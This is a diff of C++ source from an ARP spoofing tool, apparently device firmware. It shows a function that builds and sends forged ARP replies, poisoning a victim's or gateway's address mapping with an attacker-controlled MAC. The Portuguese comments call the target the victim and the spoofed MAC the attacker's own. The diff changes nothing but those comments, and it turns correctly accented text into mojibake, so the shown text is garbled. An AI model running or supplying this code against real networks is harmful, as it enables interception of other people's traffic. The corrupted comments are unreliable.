@@ -125,7 +125,7 @@ void ARPSpoofer::loop() {
 }
 
 // Function provided by @Fl1p, thank you brother!
-// Função para enviar pacotes ARP falsificados
+// FunÃ§Ã£o para enviar pacotes ARP falsificados
 void ARPSpoofer::sendARPPacket(
     uint8_t *targetIP, uint8_t *targetMAC, uint8_t *spoofedIP, uint8_t *spoofedMAC, File pcapFile
 ) {
@@ -151,22 +151,22 @@ void ARPSpoofer::sendARPPacket(
     ethhdr = (struct eth_hdr *)p->payload;
     arphdr = (struct etharp_hdr *)((u8_t *)p->payload + SIZEOF_ETH_HDR);
 
-    // Preencher cabeçalho Ethernet
-    MEMCPY(&ethhdr->dest, targetMAC, ETH_HWADDR_LEN); // MAC do alvo (vítima ou gateway)
+    // Preencher cabeÃ§alho Ethernet
+    MEMCPY(&ethhdr->dest, targetMAC, ETH_HWADDR_LEN); // MAC do alvo (vÃ­tima ou gateway)
     MEMCPY(&ethhdr->src, spoofedMAC, ETH_HWADDR_LEN); // MAC do atacante (nosso)
     ethhdr->type = PP_HTONS(ETHTYPE_ARP);
 
-    // Preencher cabeçalho ARP
-    arphdr->hwtype = PP_HTONS(1); // 1 é o código para Ethernet no campo hardware type (hwtype)
+    // Preencher cabeÃ§alho ARP
+    arphdr->hwtype = PP_HTONS(1); // 1 Ã© o cÃ³digo para Ethernet no campo hardware type (hwtype)
     arphdr->proto = PP_HTONS(ETHTYPE_IP);
     arphdr->hwlen = ETH_HWADDR_LEN;
     arphdr->protolen = sizeof(ip4_addr_t);
     arphdr->opcode = PP_HTONS(ARP_REPLY);
 
-    MEMCPY(&arphdr->shwaddr, spoofedMAC, ETH_HWADDR_LEN);    // MAC falsificado (gateway ou vítima)
-    MEMCPY(&arphdr->sipaddr, spoofedIP, sizeof(ip4_addr_t)); // IP falsificado (gateway ou vítima)
-    MEMCPY(&arphdr->dhwaddr, targetMAC, ETH_HWADDR_LEN);     // MAC real do alvo (vítima ou gateway)
-    MEMCPY(&arphdr->dipaddr, targetIP, sizeof(ip4_addr_t));  // IP real do alvo (vítima ou gateway)
+    MEMCPY(&arphdr->shwaddr, spoofedMAC, ETH_HWADDR_LEN);    // MAC falsificado (gateway ou vÃ­tima)
+    MEMCPY(&arphdr->sipaddr, spoofedIP, sizeof(ip4_addr_t)); // IP falsificado (gateway ou vÃ­tima)
+    MEMCPY(&arphdr->dhwaddr, targetMAC, ETH_HWADDR_LEN);     // MAC real do alvo (vÃ­tima ou gateway)
+    MEMCPY(&arphdr->dipaddr, targetIP, sizeof(ip4_addr_t));  // IP real do alvo (vÃ­tima ou gateway)
 
     // Enviar o pacote
     netif->linkoutput(netif, p);
